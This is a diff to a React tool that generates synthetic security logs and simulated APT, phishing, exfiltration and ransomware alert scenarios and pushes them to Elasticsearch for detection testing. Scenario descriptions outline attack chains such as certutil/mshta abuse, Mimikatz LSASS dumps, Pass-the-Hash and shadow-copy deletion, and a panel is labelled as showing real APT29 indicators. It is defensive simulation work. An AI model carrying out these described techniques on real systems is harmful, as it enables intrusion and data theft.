+  {id:'apt29',name:'APT29 — Midnight Blizzard',description:'State-sponsored: OAuth phishing → persistence → credential dump → lateral movement → C2 → exfiltration. Generates Kibana security alerts for Attack Discovery.',severity:'critical',type:'apt',tactics:['Initial Access','Execution','Persistence','Defense Evasion','Credential Access','Discovery','Lateral Movement','Collection','Command and Control','Exfiltration'],generator:generateAPT29Scenario},
+  {id:'lotl',name:'APT — Living off the Land',description:'Fileless attack using only Windows built-in tools: certutil → mshta → schtasks → log clearing → NTDS dump → WMI → exfil. Generates Kibana security alerts for Attack Discovery.',severity:'critical',type:'apt',tactics:['Execution','Persistence','Defense Evasion','Privilege Escalation','Credential Access','Discovery','Lateral Movement','Collection','Exfiltration'],generator:generateLotLScenario},
+  {id:'phishing',name:'Phishing Attack',description:'Spearphishing email → file download → execution → C2 beacon. Full Initial Access → Execution → C2 chain.',severity:'critical',type:'raw',tactics:['Initial Access','Execution','Command & Control'],generator:generatePhishingScenario},
+  {id:'phishing-lateral',name:'Phishing + Lateral Movement',description:'Phishing compromise → LSASS dump via Mimikatz → Pass-the-Hash → PsExec lateral movement to second host.',severity:'critical',type:'raw',tactics:['Initial Access','Credential Access','Lateral Movement'],generator:generatePhishingLateralScenario},
+  {id:'exfiltration',name:'Data Exfiltration',description:'File staging → 7-Zip password archive → HTTPS upload + DNS tunneling → audit log cleared.',severity:'critical',type:'raw',tactics:['Collection','Exfiltration','Defense Evasion'],generator:generateExfiltrationScenario},
+  {id:'ransomware',name:'Ransomware Outbreak',description:'Office macro → encoded PowerShell → VSS deletion → mass file encryption → EternalBlue SMB spread.',severity:'critical',type:'raw',tactics:['Execution','Impact','Lateral Movement'],generator:generateRansomwareScenario},
 ];
 
 // ─── UI Components ────────────────────────────────────────────────────────────
@@ -297,7 +573,7 @@ function ConfigDialog({open,onClose,onSave}){
 
 // Vendor Card
 const WIN_TYPE_LABELS={security:'Security',application:'Application',system:'System',applocker:'AppLocker',powershell:'PowerShell'};
-function VendorCard({vendor,selected,onToggle,integrationMissing,randomness,onRandomness,minLogs,onMinLogs,emailDomain,onEmailDomain,windowsLogTypes,onWindowsLogTypes}){
+function VendorCard({vendor,selected,onToggle,integrationMissing,randomness,onRandomness,minLogs,onMinLogs,emailDomain,onEmailDomain,windowsLogTypes,onWindowsLogTypes,hostnamePrefix,onHostnamePrefix,hostnameCap,onHostnameCap,includeAdmin,onIncludeAdmin,indexOverride,onIndexOverride}){
   return(
     <div onClick={()=>onToggle(vendor.id)} className={cn("relative cursor-pointer p-4 rounded-xl border-2 transition-all",selected?"border-blue-500 bg-blue-500/10 shadow-lg shadow-blue-500/10":"border-gray-700 hover:border-gray-500 bg-gray-900/60")}>
       {selected&&<div className="absolute top-2 right-2 w-5 h-5 rounded-full bg-blue-500 flex items-center justify-center"><span className="text-white text-[10px]">✓</span></div>}
@@ -335,22 +611,50 @@ function VendorCard({vendor,selected,onToggle,integrationMissing,randomness,onRa
               <input type="text" value={emailDomain} onChange={e=>onEmailDomain(e.target.value)} placeholder="e.g. acme.com" className="w-full bg-gray-900 border border-gray-600 rounded px-2 py-1 text-xs font-mono text-gray-200 focus:outline-none focus:border-blue-500"/>
             </div>
           )}
+          {(vendor.id==='windows'||vendor.id==='linux'||vendor.id==='endpoint')&&(
+            <div className="mb-2 space-y-1.5">
+              <div>
+                <label className="text-[10px] text-gray-500 block mb-1">Hostname prefix <span className="text-gray-600">(optional)</span></label>
+                <input type="text" value={hostnamePrefix||''} onChange={e=>onHostnamePrefix(vendor.id,e.target.value)} placeholder={vendor.id==='windows'?'e.g. CORP-WIN':vendor.id==='linux'?'e.g. app-server':'e.g. DESKTOP'} className="w-full bg-gray-900 border border-gray-600 rounded px-2 py-1 text-xs font-mono text-gray-200 focus:outline-none focus:border-blue-500"/>
+                {hostnamePrefix&&<p className="text-[9px] text-blue-400/70 mt-0.5">→ {hostnamePrefix}-001, {hostnamePrefix}-002…</p>}
+              </div>
+              <div className="flex items-center gap-2">
+                <label className="text-[10px] text-gray-500 flex-1">Max unique hosts</label>
+                <input type="number" min="1" max="500" value={hostnameCap??''} onChange={e=>onHostnameCap(vendor.id,e.target.value)} placeholder={String(VENDOR_POOL[vendor.id]?.[randomness]??'∞')} className="w-16 bg-gray-900 border border-gray-600 rounded px-2 py-0.5 text-xs font-mono text-gray-200 focus:outline-none focus:border-blue-500 text-right"/>
+              </div>
+            </div>
+          )}
+          {(vendor.id==='endpoint'||vendor.id==='windows'||vendor.id==='linux')&&(
+            <div className="flex items-center justify-between mb-2">
+              <span className="text-[10px] text-gray-500">Include admin users</span>
+              <button type="button" onClick={()=>onIncludeAdmin(vendor.id,!includeAdmin)}
+                className="relative flex items-center rounded-full transition-colors"
+                style={{width:28,height:16,background:includeAdmin?'rgba(59,130,246,0.8)':'rgba(75,85,99,0.6)',border:'1px solid '+(includeAdmin?'rgba(59,130,246,0.6)':'rgba(107,114,128,0.4)')}}>
+                <span style={{position:'absolute',width:10,height:10,borderRadius:'50%',background:'white',top:2,left:includeAdmin?14:2,transition:'left 0.15s'}}/>
+              </button>
+            </div>
+          )}
           {vendor.id==='windows'&&(
             <div className="mb-2">
               <span className="text-[10px] text-gray-500 block mb-1">Log types</span>
-              <div className="grid grid-cols-2 gap-x-2 gap-y-1">
+              <div className="grid grid-cols-2 gap-x-1.5 gap-y-1">
                 {Object.entries(WIN_TYPE_LABELS).map(([t,label])=>{
-                  const checked=(windowsLogTypes||[]).includes(t);
-                  const toggle=()=>{
-                    const next=checked?(windowsLogTypes||[]).filter(x=>x!==t):[...(windowsLogTypes||[]),t];
+                  const isOptional=t==='applocker'||t==='powershell';
+                  const checked=(windowsLogTypes||WIN_TYPES_DEFAULT).includes(t);
+                  const toggle=e=>{
+                    e.stopPropagation();
+                    const cur=windowsLogTypes||WIN_TYPES_DEFAULT;
+                    const next=checked?cur.filter(x=>x!==t):[...cur,t];
                     if(next.length>0)onWindowsLogTypes(next);
                   };
                   return(
-                    <label key={t} className="flex items-center gap-1.5 cursor-pointer select-none" onClick={e=>e.stopPropagation()}>
-                      <input type="checkbox" checked={checked} onChange={toggle} className="accent-blue-500 w-3 h-3"/>
-                      <span className={`text-[10px] ${checked?'text-gray-200':'text-gray-500'}`}>{label}</span>
-                      {(t==='applocker'||t==='powershell')&&<span className="text-[9px] text-blue-400/70">opt</span>}
-                    </label>
+                    <button key={t} type="button" onClick={toggle}
+                      className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-medium transition-colors select-none"
+                      style={{background:checked?'rgba(34,197,94,0.15)':isOptional?'rgba(239,68,68,0.15)':'rgba(55,65,81,0.6)',border:`1px solid ${checked?'rgba(34,197,94,0.5)':isOptional?'rgba(239,68,68,0.4)':'rgba(75,85,99,0.5)'}`,color:checked?'#86efac':isOptional?'#fca5a5':'#9ca3af'}}>
+                      <span style={{opacity:0.8}}>{checked?'✓':'✗'}</span>
+                      {label}
+                      {isOptional&&<span style={{fontSize:'8px',opacity:0.7,marginLeft:'1px'}}>opt</span>}
+                    </button>
                   );
                 })}
               </div>
@@ -362,6 +666,11 @@ function VendorCard({vendor,selected,onToggle,integrationMissing,randomness,onRa
               {vendor.indices.length>2&&<p className="text-[9px] font-mono text-gray-500">+{vendor.indices.length-2} more</p>}
             </div>
           )}
+          <div className="mt-2 pt-2 border-t border-blue-500/10">
+            <label className="text-[10px] text-gray-500 block mb-1">Index override <span className="text-gray-600">(optional)</span></label>
+            <input type="text" value={indexOverride||''} onChange={e=>onIndexOverride(vendor.id,e.target.value)} placeholder={vendor.indices[0]} className="w-full bg-gray-900 border border-gray-600 rounded px-2 py-1 text-[10px] font-mono text-gray-200 focus:outline-none focus:border-amber-500 placeholder:text-gray-600"/>
+            {indexOverride&&vendor.indices.length>1&&<p className="text-[9px] text-amber-400/70 mt-0.5">⚠ Overrides all {vendor.indices.length} default indices</p>}
+          </div>
           {integrationMissing&&<p className="text-[9px] text-amber-400 mt-1">⚠ Integration not in Fleet</p>}
         </div>
       )}
@@ -412,6 +721,164 @@ function LogViewer({logs,vendorLabels}){
             </div>
           ))}
         </pre>
+      </div>
+    </div>
+  );
+}
+
+// APT Scenario Viewer
+const SEV_COLOR={critical:'border-l-red-500',high:'border-l-orange-400',medium:'border-l-yellow-400',low:'border-l-blue-400'};
+const SEV_DOT={critical:'bg-red-500',high:'bg-orange-400',medium:'bg-yellow-400',low:'bg-blue-400'};
+const SEV_BADGE={critical:'border-red-500/40 text-red-400 bg-red-500/10',high:'border-orange-400/40 text-orange-400 bg-orange-400/10',medium:'border-yellow-400/40 text-yellow-300 bg-yellow-400/10',low:'border-blue-400/40 text-blue-400 bg-blue-400/10'};
+const NOISE_LABELS={off:'No noise',low:'Low (~250 logs, 3 hosts)',medium:'Medium (~750 logs, 10 hosts)',high:'High (~1,650 logs, 20 hosts)'};
+
+function APTScenarioViewer({scenario,data,elasticConfig}){
+  const [noiseLevel,setNoiseLevel]=useState('medium');
+  const [pushing,setPushing]=useState(false);
+  const [pushResult,setPushResult]=useState(null);
+  const [expanded,setExpanded]=useState({});
+  const [showCurl,setShowCurl]=useState(false);
+  const [showIocs,setShowIocs]=useState(false);
+  if(!data?.alerts?.length)return null;
+  const {meta,ctx,alerts}=data;
+  const crits=alerts.filter(a=>a.kibana.alert.severity==='critical').length;
+  const toggle=i=>setExpanded(p=>({...p,[i]:!p[i]}));
+
+  const push=async()=>{
+    if(!elasticConfig?.url){alert('No Elasticsearch config found');return;}
+    setPushing(true);setPushResult(null);
+    try{
+      const bulkLines=[];
+      // 1. Attack alerts → .alerts-security.alerts-default
+      alerts.forEach(a=>{
+        bulkLines.push(JSON.stringify({create:{_index:'.alerts-security.alerts-default'}}));
+        bulkLines.push(JSON.stringify(a));
+      });
+      // 2. Noise → vendor indices
+      const noise=generateScenarioNoise(noiseLevel);
+      Object.entries(noise).forEach(([vid,rawLogs])=>{
+        const ing=VENDOR_INGEST[vid];if(!ing)return;
+        rawLogs.forEach(raw=>{
+          bulkLines.push(JSON.stringify({create:{_index:ing.getIndex(raw)}}));
+          bulkLines.push(JSON.stringify(ing.toDoc(raw)));
+        });
+      });
+      const noiseCount=Object.values(noise).reduce((s,l)=>s+l.length,0);
+      const res=await fetch(`${elasticConfig.url.replace(/\/$/,'')}/_bulk`,{method:'POST',headers:buildHeaders(elasticConfig),body:bulkLines.join('\n')+'\n'});
+      if(!res.ok)throw new Error(`HTTP ${res.status}: ${res.statusText}`);
+      const d=await res.json();
+      const errs=d.items?.filter(i=>i.create?.error||i.index?.error)||[];
+      setPushResult({alerts:alerts.length,noise:noiseCount,errors:errs.length,firstError:errs[0]?.create?.error?.reason||errs[0]?.index?.error?.reason});
+    }catch(e){setPushResult({error:e.message});}
+    finally{setPushing(false);}
+  };
+
+  const curl=elasticConfig?`curl -X POST "${elasticConfig.url.replace(/\/$/,'')}/_bulk" \\\n  -H "Authorization: ApiKey ${elasticConfig.apiKey}" \\\n  -H "Content-Type: application/x-ndjson" \\\n  --data-binary @apt-alerts.ndjson`:'';
+
+  const dl=()=>{
+    const noise=generateScenarioNoise(noiseLevel);
+    const lines=[
+      ...alerts.map(a=>`${JSON.stringify({create:{_index:'.alerts-security.alerts-default'}})}\n${JSON.stringify(a)}`),
+      ...Object.entries(noise).flatMap(([vid,rawLogs])=>{const ing=VENDOR_INGEST[vid];if(!ing)return[];return rawLogs.map(raw=>`${JSON.stringify({create:{_index:ing.getIndex(raw)}})}\n${JSON.stringify(ing.toDoc(raw))}`);})
+    ];
+    const b=new Blob([lines.join('\n')+'\n'],{type:'application/x-ndjson'});
+    const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download=`${scenario.id}-alerts.ndjson`;a.click();URL.revokeObjectURL(u);
+  };
+
+  return(
+    <div className="rounded-xl border border-gray-700 bg-gray-900 overflow-hidden">
+      <div className="p-4 border-b border-gray-700 space-y-3">
+        <div className="flex items-start justify-between flex-wrap gap-2">
+          <div>
+            <div className="flex items-center gap-2 mb-1">
+              <span className="text-sm font-semibold text-white">{meta.name}</span>
+              <Badge className="border-red-500/40 text-red-400 bg-red-500/10">{alerts.length} alerts</Badge>
+              {crits>0&&<Badge className="border-red-500/40 text-red-400 bg-red-500/5">{crits} critical</Badge>}
+              <Badge className="border-purple-500/40 text-purple-400 bg-purple-500/10">APT</Badge>
+            </div>
+            <p className="text-xs text-gray-400 max-w-2xl">{meta.description}</p>
+            <p className="text-[10px] text-gray-500 mt-1">Attacker: <span className="text-gray-400">{meta.attackerProfile}</span> · Alerts index: <span className="font-mono text-blue-400/80">.alerts-security.alerts-default</span></p>
+          </div>
+        </div>
+        {ctx&&<div className="rounded-lg border border-amber-500/20 bg-amber-500/5 p-3 space-y-2">
+          <button onClick={()=>setShowIocs(s=>!s)} className="flex items-center gap-2 w-full text-left">
+            <span className="text-[11px] font-semibold text-amber-400">IOC Summary</span>
+            <Badge className="border-amber-500/30 text-amber-400/80 bg-amber-500/10 text-[9px]">Real APT29 IOCs — VirusTotal detectable</Badge>
+            <span className="text-[10px] text-gray-500 ml-auto">{showIocs?'▲ hide':'▼ show'}</span>
+          </button>
+          {showIocs&&<div className="grid grid-cols-1 md:grid-cols-2 gap-3 pt-1">
+            <div className="space-y-1">
+              <p className="text-[10px] font-semibold text-gray-400 uppercase tracking-wider">Malware</p>
+              <div className="space-y-0.5">
+                <p className="text-[10px] text-gray-500">Family: <span className="text-amber-300 font-mono">{ctx.malwareFamily}</span></p>
+                <p className="text-[10px] text-gray-500">File: <span className="text-gray-300 font-mono">{ctx.malwareFile}</span></p>
+                <p className="text-[10px] text-gray-500 break-all">SHA256: <span className="text-red-400 font-mono">{ctx.malwareHash}</span></p>
+              </div>
+            </div>
+            <div className="space-y-1">
+              <p className="text-[10px] font-semibold text-gray-400 uppercase tracking-wider">Network IOCs</p>
+              <div className="space-y-0.5">
+                <p className="text-[10px] text-gray-500">C2 IP #1: <span className="text-red-400 font-mono">{ctx.c2IP}</span></p>
+                <p className="text-[10px] text-gray-500">C2 IP #2: <span className="text-red-400 font-mono">{ctx.c2IP2}</span></p>
+                <p className="text-[10px] text-gray-500">C2 Domain: <span className="text-orange-400 font-mono">{ctx.c2Domain}</span></p>
+                <p className="text-[10px] text-gray-500">Phishing: <span className="text-orange-400 font-mono">{ctx.phishingDomain}</span></p>
+              </div>
+            </div>
+          </div>}
+        </div>}
+        <div className="flex items-center gap-3 flex-wrap">
+          <div className="flex items-center gap-2">
+            <span className="text-[10px] text-gray-500">Background noise:</span>
+            {['off','low','medium','high'].map(l=>(
+              <button key={l} onClick={()=>setNoiseLevel(l)} className={cn('px-2 py-0.5 rounded text-[10px] font-medium transition-colors',noiseLevel===l?'bg-blue-500 text-white':'bg-gray-700/80 text-gray-400 hover:bg-gray-600 hover:text-white')}>
+                {l.charAt(0).toUpperCase()+l.slice(1)}
+              </button>
+            ))}
+            {noiseLevel!=='off'&&<span className="text-[10px] text-gray-600">{NOISE_LABELS[noiseLevel]}</span>}
+          </div>
+          <div className="flex gap-1.5 ml-auto flex-wrap">
+            <Button size="sm" variant="outline" onClick={dl}>⬇ NDJSON</Button>
+            {elasticConfig?.url&&<><Button size="sm" variant="outline" onClick={()=>setShowCurl(!showCurl)}>$ curl</Button><Button size="sm" onClick={push} disabled={pushing}>{pushing?'Pushing…':'⬆ Push to ES'}</Button></>}
+          </div>
+        </div>
+        {showCurl&&curl&&<pre className="bg-gray-950 rounded-lg p-3 text-xs font-mono text-gray-300 whitespace-pre-wrap">{curl}</pre>}
+        {pushResult&&!pushResult.error&&(
+          <div className={cn('flex items-center gap-2 p-2 rounded-lg text-xs',pushResult.errors>0?'bg-amber-500/10 border border-amber-500/30 text-amber-300':'bg-green-500/10 border border-green-500/30 text-green-400')}>
+            {pushResult.errors>0?'⚠':'✓'} Pushed {pushResult.alerts} attack alerts + {pushResult.noise} noise logs{pushResult.errors>0?` — ${pushResult.errors} errors: ${pushResult.firstError}`:''}
+          </div>
+        )}
+        {pushResult?.error&&<div className="flex items-center gap-2 p-2 rounded-lg text-xs bg-red-500/10 border border-red-500/30 text-red-400">✗ {pushResult.error}</div>}
+      </div>
+      <div className="p-4 space-y-2 max-h-[600px] overflow-y-auto">
+        {alerts.map((a,i)=>{
+          const sev=a.kibana.alert.severity;
+          const rule=a.kibana.alert.rule;
+          const threat=rule.threat?.[0];
+          return(
+            <div key={i} className={cn('border-l-2 bg-gray-800/40 rounded-r-lg overflow-hidden',SEV_COLOR[sev])}>
+              <div className="flex items-start gap-3 p-3 cursor-pointer hover:bg-gray-700/30 transition-colors" onClick={()=>toggle(i)}>
+                <div className="flex items-center gap-2 shrink-0 pt-0.5">
+                  <span className="text-[10px] font-mono text-gray-500 w-4 text-right">{i+1}</span>
+                  <div className={cn('w-2 h-2 rounded-full shrink-0',SEV_DOT[sev])}/>
+                </div>
+                <div className="flex-1 min-w-0">
+                  <div className="flex items-center gap-2 flex-wrap mb-0.5">
+                    <Badge className={SEV_BADGE[sev]}>{sev}</Badge>
+                    <span className="text-xs font-medium text-white">{rule.name}</span>
+                  </div>
+                  <div className="flex items-center gap-3 flex-wrap">
+                    <span className="text-[10px] text-gray-400">🖥 {a.host.name}</span>
+                    <span className="text-[10px] text-gray-400">👤 {a.user.name}</span>
+                    {a.process?.name&&<span className="text-[10px] text-gray-500 font-mono">{a.process.name}</span>}
+                  </div>
+                  {threat&&<p className="text-[10px] text-purple-400/80 mt-0.5">{threat.tactic.name} · {threat.technique?.[0]?.id} {threat.technique?.[0]?.name}</p>}
+                </div>
+                <span className="text-gray-500 text-xs shrink-0">{expanded[i]?'▲':'▼'}</span>
+              </div>
+              {expanded[i]&&<pre className="text-[10px] p-3 pt-0 text-gray-400 whitespace-pre-wrap break-all border-t border-gray-700/50 bg-gray-950/50 font-mono">{JSON.stringify(a,null,2)}</pre>}
+            </div>
+          );
+        })}
       </div>
     </div>
   );
@@ -508,9 +975,14 @@ export default function App(){
   const [pushing,setPushing]=useState(false);
   const [emailDomain,setEmailDomain]=useState('');
   const [windowsLogTypes,setWindowsLogTypes]=useState(WIN_TYPES_DEFAULT);
+  const [vendorHostnamePrefix,setVendorHostnamePrefix]=useState({windows:'',linux:'',endpoint:''});
+  const [vendorHostnameCap,setVendorHostnameCap]=useState({windows:null,linux:null,endpoint:null});
+  const [vendorIncludeAdmin,setVendorIncludeAdmin]=useState({endpoint:false,windows:false,linux:false});
+  const [vendorIndexOverride,setVendorIndexOverride]=useState({});
   // Scenarios state
   const [activeScenario,setActiveScenario]=useState(null);
   const [scenarioEvents,setScenarioEvents]=useState([]);
+  const [aptScenarioData,setAptScenarioData]=useState(null);
 
   // Keep maxLogs >= sum of selected minimums
   useEffect(()=>{
@@ -546,6 +1018,10 @@ export default function App(){
     const n=Math.max(1,parseInt(val)||1);
     setVendorMinLogs(p=>({...p,[id]:n}));
   },[]);
+  const handleHostnamePrefix=useCallback((id,val)=>setVendorHostnamePrefix(p=>({...p,[id]:val})),[]);
+  const handleHostnameCap=useCallback((id,val)=>setVendorHostnameCap(p=>({...p,[id]:val===''?null:Math.max(1,parseInt(val)||1)})),[]);
+  const handleIncludeAdmin=useCallback((id,val)=>setVendorIncludeAdmin(p=>({...p,[id]:val})),[]);
+  const handleIndexOverride=useCallback((id,val)=>setVendorIndexOverride(p=>({...p,[id]:val})),[]);
   const handleGenerate=useCallback(()=>{
     setGenerating(true);
     setTimeout(()=>{
@@ -569,11 +1045,17 @@ export default function App(){
       selected.forEach(vid=>{
         const v=VENDORS.find(x=>x.id===vid);if(!v)return;
         const lvl=vendorRandomness[vid]||'med';
-        setPool(VENDOR_POOL[vid]?.[lvl]??null);
+        const prefix=['windows','linux','endpoint'].includes(vid)?(vendorHostnamePrefix[vid]?.trim()||null):null;
+        _hostnamePrefix=prefix;
+        const poolSize=vendorHostnameCap[vid]!=null?vendorHostnameCap[vid]:(VENDOR_POOL[vid]?.[lvl]??null);
+        setPool(poolSize,prefix);
         _emailDomain=vid==='email'?(emailDomain.trim()||null):null;
+        _includeAdminUsers=['endpoint','windows','linux'].includes(vid)?(vendorIncludeAdmin[vid]||false):false;
         nl[v.id]=vid==='windows'?generateWindowsEventLogs(vendorTotals[vid],parseInt(timeRange),windowsLogTypes):v.generator(vendorTotals[vid],parseInt(timeRange));
       });
       _emailDomain=null;
+      _hostnamePrefix=null;
+      _includeAdminUsers=false;
       setLogs(nl);setGenerating(false);
     },300);
   },[selected,vendorMinLogs,maxLogs,vendorRandomness,timeRange,emailDomain,windowsLogTypes]);
@@ -581,7 +1063,7 @@ export default function App(){
   const handlePush=useCallback(async()=>{
     setPushing(true);
     try{
-      const{total,errors,indices}=await pushLogsToElastic(logs);
+      const{total,errors,indices}=await pushLogsToElastic(logs,vendorIndexOverride);
       const idxList=Object.entries(indices).map(([idx,n])=>`${idx}(${n})`).join(', ');
       if(errors>0)alert(`⚠ Pushed ${total-errors}/${total} logs. ${errors} errors.\n${idxList}`);
       else alert(`✓ Pushed ${total} logs across ${Object.keys(indices).length} indices\n${idxList}`);
@@ -589,7 +1071,11 @@ export default function App(){
     finally{setPushing(false);}
   },[logs,elasticConfig]);
 
-  const handleScenario=s=>{setActiveScenario(s);setScenarioEvents(s.generator());};
+  const handleScenario=s=>{
+    setActiveScenario(s);
+    if(s.type==='apt'){setAptScenarioData(s.generator());setScenarioEvents([]);}
+    else{setScenarioEvents(s.generator());setAptScenarioData(null);}
+  };
   const saveConfig=cfg=>{setElasticConfig(cfg);};
 
   const totalLogs=Object.values(logs).reduce((s,l)=>s+l.length,0);
@@ -646,7 +1132,7 @@ export default function App(){
               <div className="lg:col-span-3">
                 <h2 className="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-4">Log Sources</h2>
                 <div className="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-3 gap-3">
-                  {VENDORS.map(v=><VendorCard key={v.id} vendor={v} selected={selected.includes(v.id)} onToggle={toggleVendor} integrationMissing={false} randomness={vendorRandomness[v.id]} onRandomness={handleRandomness} minLogs={vendorMinLogs[v.id]||50} onMinLogs={handleMinLogs} emailDomain={emailDomain} onEmailDomain={setEmailDomain}/>)}
+                  {VENDORS.map(v=><VendorCard key={v.id} vendor={v} selected={selected.includes(v.id)} onToggle={toggleVendor} integrationMissing={false} randomness={vendorRandomness[v.id]} onRandomness={handleRandomness} minLogs={vendorMinLogs[v.id]||50} onMinLogs={handleMinLogs} emailDomain={emailDomain} onEmailDomain={setEmailDomain} windowsLogTypes={windowsLogTypes} onWindowsLogTypes={handleWindowsLogTypes} hostnamePrefix={vendorHostnamePrefix[v.id]||''} onHostnamePrefix={handleHostnamePrefix} hostnameCap={vendorHostnameCap[v.id]??null} onHostnameCap={handleHostnameCap} includeAdmin={vendorIncludeAdmin[v.id]||false} onIncludeAdmin={handleIncludeAdmin} indexOverride={vendorIndexOverride[v.id]||''} onIndexOverride={handleIndexOverride}/>)}
                 </div>
               </div>
               <div className="lg:col-span-1">
@@ -731,6 +1217,12 @@ export default function App(){
                 ))}
               </div>
             </div>
+            {activeScenario&&aptScenarioData&&(
+              <div>
+                <h2 className="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-4">Scenario Output</h2>
+                <APTScenarioViewer scenario={activeScenario} data={aptScenarioData} elasticConfig={elasticConfig}/>
+              </div>
+            )}
             {activeScenario&&scenarioEvents.length>0&&(
               <div>
                 <h2 className="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-4">Scenario Output</h2>
